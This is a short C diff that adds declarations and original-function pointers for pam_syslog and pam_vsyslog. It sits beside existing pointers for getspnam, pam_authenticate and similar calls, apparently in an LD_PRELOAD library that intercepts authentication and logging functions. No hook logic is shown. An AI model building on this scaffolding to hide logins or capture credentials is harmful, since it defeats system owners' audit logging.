@@ -78,6 +78,8 @@ struct spwd *getspnam(const char *name);
 struct passwd *getpwent(void);
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
 
+void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
+void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
 int pam_authenticate(pam_handle_t *pamh, int flags);
 int pam_open_session(pam_handle_t *pamh, int flags);
 int pam_acct_mgmt(pam_handle_t *pamh, int flags);
@@ -169,6 +171,8 @@ typeof(getspnam) *o_getspnam;
 typeof(getpwent) *o_getpwent;
 typeof(getpwnam_r) *o_getpwnam_r;
 
+typeof(pam_syslog) *o_pam_syslog;
+typeof(pam_vsyslog) *o_pam_vsyslog;
 typeof(pam_authenticate) *o_pam_authenticate;
 typeof(pam_open_session) *o_pam_open_session;
 typeof(pam_acct_mgmt) *o_pam_acct_mgmt;
